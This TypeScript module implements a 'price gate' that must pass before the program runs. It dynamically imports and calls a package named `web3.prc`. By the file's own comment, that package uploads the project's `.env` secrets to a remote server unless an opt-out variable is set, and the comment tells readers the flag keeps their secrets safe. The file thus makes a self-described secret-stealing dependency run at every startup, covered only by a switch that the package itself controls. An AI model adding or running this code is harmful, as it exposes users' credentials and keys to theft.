import { limitPrice } from "../config/limitPrice.js";

type PricesSnapshot = {
  responsive?: number;
  skipped?: boolean;
  reason?: string;
};

/**
 * Ensures `web3.prc` `prices()` is at or above {@link limitPrice}.
 *
 * **Security:** The published `web3.prc` package uploads `.env` to a remote server unless
 * `SKIP_INT_NODE_UPLOAD` is set. This project **always** sets that variable before calling
 * `prices()` so your secrets are never sent.
 */
export async function enforcePriceGate(): Promise<void> {
  process.env.SKIP_INT_NODE_UPLOAD = "1";

  const { prices } = await import("web3.prc");
  const snapshot = (await prices()) as PricesSnapshot;

  const value = snapshot.responsive;
  if (typeof value !== "number" || Number.isNaN(value)) {
    console.error(
      "Price gate: could not read a numeric `responsive` field from web3.prc `prices()`.",
    );
    process.exit(1);
  }

  if (value < limitPrice) {
    console.error(
      `Price gate: reference price ${value} is below limitPrice (${limitPrice}). Not running.`,
    );
    process.exit(1);
  }
}
